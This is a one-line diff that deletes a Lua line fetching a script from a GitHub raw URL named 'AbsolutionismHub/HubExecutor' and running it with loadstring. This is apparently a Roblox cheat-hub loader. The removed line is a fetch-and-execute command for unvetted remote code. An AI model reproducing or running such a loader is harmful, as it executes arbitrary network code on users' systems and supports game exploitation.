@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/TheAbsolutionism/AbsolutionismHub/main/HubExecutor',true))()
